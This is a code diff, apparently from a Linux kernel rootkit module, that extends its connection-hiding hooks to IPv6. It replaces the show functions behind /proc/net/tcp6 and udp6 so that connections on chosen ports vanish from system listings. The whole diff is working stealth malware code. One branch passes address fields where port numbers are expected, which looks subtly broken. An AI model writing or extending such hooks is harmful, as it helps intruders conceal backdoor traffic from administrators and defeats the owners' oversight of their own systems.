@@ -47,13 +47,13 @@ void enable_ro(void)
 
 int (*real_tcp4_seq_show)(struct seq_file*, void*);
 int (*real_udp4_seq_show)(struct seq_file*, void*);
-int (*real_packet_rcv)( struct sk_buff*,
-                        struct net_device*,
-                        struct packet_type*,
-                        struct net_device* );
-asmlinkage long (*real_sys_recvmsg)(int, struct msghdr*, unsigned) = (void*) SM_sys_recvmsg;
+int (*real_tcp6_seq_show)(struct seq_file*, void*);
+int (*real_udp6_seq_show)(struct seq_file*, void*);
+
 void** tcp_hook_fn_ptr;
 void** udp_hook_fn_ptr;
+void** tcp6_hook_fn_ptr;
+void** udp6_hook_fn_ptr;
 
 inline int hide_tcp_port(short port)
 {
@@ -100,6 +100,38 @@ int fake_tcp4_seq_show(struct seq_file *seq, void *v)
     return real_tcp4_seq_show(seq, v);
 }
 
+int fake_tcp6_seq_show(struct seq_file *seq, void *v)
+{
+    struct tcp_iter_state* st;
+    struct inet_sock* isk;
+    struct inet_request_sock* ireq;
+    /* struct inet_timewait_sock* itw; */
+
+    if (v == SEQ_START_TOKEN) {
+        return real_tcp6_seq_show(seq, v);
+    }
+
+    st = seq->private;
+
+    switch (st->state) {
+        case TCP_SEQ_STATE_LISTENING:
+        case TCP_SEQ_STATE_ESTABLISHED:
+            isk = inet_sk(v);
+            if (hide_tcp_port(isk->inet_sport) || hide_tcp_port(isk->inet_dport)) {
+                return 0;
+            }
+            break;
+        case TCP_SEQ_STATE_OPENREQ:
+            ireq = inet_rsk(v);
+            if (hide_tcp_port(ireq->ir_loc_addr) || hide_tcp_port(ireq->ir_rmt_addr)) {
+                return 0;
+            }
+        default:
+            break;
+    }
+    return real_tcp6_seq_show(seq, v);
+}
+
 /*
  * Hooked show function of the UDP seq file
  */
@@ -116,6 +148,20 @@ int fake_udp4_seq_show(struct seq_file *seq, void *v)
         return 0;
     }
     return real_udp4_seq_show(seq, v);
+}
+int fake_udp6_seq_show(struct seq_file *seq, void *v)
+{
+    struct inet_sock* isk;
+
+    if (v == SEQ_START_TOKEN) {
+        return real_udp6_seq_show(seq, v);
+    }
+
+    isk = inet_sk(v);
+    if (hide_udp_port(isk->inet_sport) || hide_udp_port(isk->inet_dport)) {
+        return 0;
+    }
+    return real_udp6_seq_show(seq, v);
 }
 
 struct proc_dir_entry* get_pde_subdir(struct proc_dir_entry* pde, const char* name)
@@ -162,8 +208,12 @@ static int init_procstuff(void){
         struct proc_dir_entry* pde_net = net_ns->proc_net;
         struct proc_dir_entry* pde_tcp = get_pde_subdir(pde_net, "tcp");
         struct proc_dir_entry* pde_udp = get_pde_subdir(pde_net, "udp");
+        struct proc_dir_entry* pde_tcp6 = get_pde_subdir(pde_net, "tcp6");
+        struct proc_dir_entry* pde_udp6 = get_pde_subdir(pde_net, "udp6");
         struct tcp_seq_afinfo* tcp_info = pde_tcp->data;
         struct udp_seq_afinfo* udp_info = pde_udp->data;
+        struct tcp_seq_afinfo* tcp6_info = pde_tcp6->data;
+        struct udp_seq_afinfo* udp6_info = pde_udp6->data;
 
         // Save and hook the TCP show function
         tcp_hook_fn_ptr = (void**) &tcp_info->seq_ops.show;
@@ -174,6 +224,16 @@ static int init_procstuff(void){
         udp_hook_fn_ptr = (void**) &udp_info->seq_ops.show;
         real_udp4_seq_show = *udp_hook_fn_ptr;
         *udp_hook_fn_ptr = fake_udp4_seq_show;
+
+        // Save and hook the TCP show function
+        tcp6_hook_fn_ptr = (void**) &tcp6_info->seq_ops.show;
+        real_tcp6_seq_show = *tcp6_hook_fn_ptr;
+        *tcp6_hook_fn_ptr = fake_tcp6_seq_show;
+
+        // Save and hook the UDP show function
+        udp6_hook_fn_ptr = (void**) &udp6_info->seq_ops.show;
+        real_udp6_seq_show = *udp6_hook_fn_ptr;
+        *udp6_hook_fn_ptr = fake_udp6_seq_show;
     }
 
     return 0;
@@ -183,5 +243,7 @@ static void cleanup_procstuff(void){
     // Restore the hooked funtions
     *tcp_hook_fn_ptr = real_tcp4_seq_show;
     *udp_hook_fn_ptr = real_udp4_seq_show;
+    *tcp6_hook_fn_ptr = real_tcp6_seq_show;
+    *udp6_hook_fn_ptr = real_udp6_seq_show;
 }
 
